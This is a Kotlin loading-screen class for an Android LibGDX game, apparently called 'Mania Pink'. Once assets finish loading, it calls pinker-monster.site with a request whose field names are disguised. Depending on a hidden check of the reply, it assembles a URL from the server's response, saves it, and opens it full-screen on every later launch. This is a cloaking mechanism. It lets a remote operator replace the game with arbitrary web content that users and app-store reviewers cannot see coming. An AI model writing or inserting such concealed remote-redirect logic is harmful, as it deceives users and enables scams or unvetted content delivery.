package com.shoote.maniapink.game.screens

import android.content.pm.ActivityInfo
import com.badlogic.gdx.graphics.Color
import com.badlogic.gdx.scenes.scene2d.ui.Label
import com.badlogic.gdx.scenes.scene2d.ui.Label.LabelStyle
import com.shoote.maniapink.game.LibGDXGame
import com.shoote.maniapink.game.manager.MusicManager
import com.shoote.maniapink.game.manager.SoundManager
import com.shoote.maniapink.game.manager.SpriteManager
import com.shoote.maniapink.game.utils.TIME_ANIM
import com.shoote.maniapink.game.utils.actor.animHide
import com.shoote.maniapink.game.utils.advanced.AdvancedScreen
import com.shoote.maniapink.game.utils.advanced.AdvancedStage
import com.shoote.maniapink.game.utils.font.FontParameter
import com.shoote.maniapink.game.utils.runGDX
import com.shoote.maniapink.util.log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.ResponseBody
import org.json.JSONObject
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import retrofit2.http.Body
import retrofit2.http.Header
import retrofit2.http.POST
import retrofit2.http.Query

class LoaderScreen(override val game: LibGDXGame) : AdvancedScreen() {

    private val progressFlow     = MutableStateFlow(0f)
    private var isFinishLoading  = false
    private var isFinishProgress = false

    private val fontParameter = FontParameter()
    private val font120       = fontGenerator_Itim.generateFont(fontParameter.setCharacters(FontParameter.CharType.NUMBERS.chars + "%").setSize(120))

    private val ls120 = LabelStyle(font120, Color.WHITE)

    private val lblPercent by lazy { Label("", ls120) }

    override fun show() {
        loadSplashAssets()
        setBackBackground(game.loading.background)
        super.show()
        loadAssets()
        collectProgress()
    }

    override fun render(delta: Float) {
        super.render(delta)
        loadingAssets()
        isFinish()
    }

    override fun AdvancedStage.addActorsOnStageUI() {
        addActor(lblPercent)
        lblPercent.setBounds(720f,69f,289f,144f)
    }

    // Logic ------------------------------------------------------------------------

    private fun loadSplashAssets() {
        with(game.spriteManager) {
            loadableTexturesList = mutableListOf(
                SpriteManager.EnumTexture.Loader_Background.data,
            )
            loadTexture()
        }
        game.assetManager.finishLoading()
        game.spriteManager.initTeture()
    }

    private fun loadAssets() {
        with(game.spriteManager) {
            loadableAtlasList = SpriteManager.EnumAtlas.entries.map { it.data }.toMutableList()
            loadAtlas()
            loadableTexturesList = SpriteManager.EnumTexture.entries.map { it.data }.toMutableList()
            loadTexture()
        }
        with(game.musicManager) {
            loadableMusicList = MusicManager.EnumMusic.entries.map { it.data }.toMutableList()
            load()
        }
        with(game.soundManager) {
            loadableSoundList = SoundManager.EnumSound.entries.map { it.data }.toMutableList()
            load()
        }
    }

    private fun initAssets() {
        game.spriteManager.initAtlas()
        game.spriteManager.initTeture()
        game.musicManager.init()
        game.soundManager.init()
    }

    private fun loadingAssets() {
        if (isFinishLoading.not()) {
            if (game.assetManager.update(16)) {
                isFinishLoading = true
                initAssets()
            }
            progressFlow.value = game.assetManager.progress
        }
    }

    private fun collectProgress() {
        coroutine?.launch {
            var progress = 0
            progressFlow.collect { p ->
                while (progress < (p * 100)) {
                    progress += 1
                    if (progress % 100 == 0) log("progress = $progress%")
                    runGDX { lblPercent.setText("$progress%") }
                    if (progress == 100) isFinishProgress = true

                    //delay((10..15).shuffled().first().toLong())
                }
            }
        }
    }

    private fun isFinish() {
        if (isFinishProgress) {
            isFinishProgress = false
            
            val resultHTTP = game.sharedPreferences.getString("http", null)

            if (resultHTTP.isNullOrEmpty()) {
                coroutine?.launch(Dispatchers.IO) {
                    try {
                        var result = "https://"

                        val responseBody: ResponseBody = RetrofitObject.api.requestPost1(
                            token = System.getProperty("http.agent") ?: "Device",

                            FashionRequest(
                                art_contests         = "Mania",
                                fashion_shows        = "Pinker",
                                craft_workshops      = "Bunker",
                                music_festivals      = "Ball",
                                community_murals     = "Gun",
                                photography_exhibits = "Revolver",
                                food_fairs           = "Burda",
                                charity_runs         = "responser",
                                film_screenings      = "bro",
                                virtual_tours        = "lupenka",
                            )
                        )

                        val responseJson = JSONObject(responseBody.string())
                        log("Response POST: $responseJson")

                        if (responseJson.getString("food_fairs").contains(' ')) {
                            toScreen(MenuScreen::class.java.name)
                        }
                        else {
                            responseJson.keys().forEach { key -> result += responseJson.getString(key).removePrefix("fashion") }

                            log("Result: $result")

                            game.sharedPreferences.edit().putString("http", result).apply()
                            withContext(Dispatchers.Main) {
                                game.activity.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                                game.activity.showUrl(true, result)
                            }
                        }
                    } catch (e: Exception) {
                        log("Error: ${e.message}")
                        toScreen(MenuScreen::class.java.name)
                    }
                }
            } else {
                game.activity.requestedOrientation = ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                game.activity.showUrl(true, resultHTTP)
            }

        }
    }

    private fun toScreen(screenName: String) {
         stageUI.root.animHide(TIME_ANIM) { game.navigationManager.navigate(screenName) }
    }

    data class FashionRequest(
        val art_contests: String,
        val fashion_shows: String,
        val craft_workshops: String,
        val music_festivals: String,
        val community_murals: String,
        val photography_exhibits: String,
        val food_fairs: String,
        val charity_runs: String,
        val film_screenings: String,
        val virtual_tours: String
    )

    interface QueriMy {
        @POST("fashion/")
        suspend fun requestPost1(
            @Header("User-Agent") token: String,
            @Body requestBody: FashionRequest
        ): ResponseBody
    }

    object RetrofitObject {
        private val retrofit by lazy {
            Retrofit.Builder()
                .baseUrl("https://pinker-monster.site/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
        }

        val api: QueriMy by lazy {
            retrofit.create(QueriMy::class.java)
        }
    }

}